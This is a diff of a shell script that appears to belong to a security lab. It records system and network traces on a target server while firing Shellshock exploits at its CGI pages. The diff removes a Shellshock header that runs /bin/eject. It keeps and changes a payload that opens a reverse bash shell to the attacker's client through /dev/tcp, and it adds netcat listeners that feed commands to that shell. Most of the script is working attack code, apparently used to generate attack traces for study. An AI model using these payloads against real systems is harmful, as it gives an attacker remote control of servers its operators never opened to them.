@@ -8,24 +8,25 @@ ssh -i ./server.pem softseclab@$theserver  sudo sysdig_cap -w stream-$i.scap -z 
 
 
 ssh -i ./server.pem softseclab@$theserver sudo nohup tcpdump_cap -i eth0 -s0 -w stream-$i.cap port not 22 and port not 3490 and port not 3492 and port not 3790 and port not 80 >pdump.out &
+sleep 5
+tail -f fifo1 | nc -l 8000 &
+nc -l 9000  > outfile &
 
-sleep 2
-curl -k -A "() { :;}; /bin/eject" https://$theserver/guestbook.html
-sleep 1
-ssh -i ./server.pem softseclab@$theserver nc -l -p 8000 &
-sleep 2 
-curl -k -A "() { :; }; /bin/bash -i >& /dev/tcp/$theclient/8000 0>&1" https://$theserver/cgi-bin/ss
 
-sleep 2
+curl -k -A "() { :; };/bin/bash -i >& /dev/tcp/$theclient/8000 0>&1" --data @data.txt https://$theserver/cgi-bin/ss & 
+cat test4 > fifo1
+sleep 15 
 
-ssh -i ./server.pem softseclab@$theserver sudo killall -s SIGINT sysdig_cap 
+
+ssh -i ./server.pem softseclab@$theserver sudo killall -s SIGINT sysdig_cap
 ssh -i ./server.pem softseclab@$theserver sudo killall -s SIGINT tcpdump_cap
-ssh -i ./server.pem softseclab@$theserver sudo killall -s SIGINT nc
+sudo killall -s SIGINT nc
+sudo killall -9 tail
 
 
 
 
-sleep 2
+
+sleep 4
 done
-
 
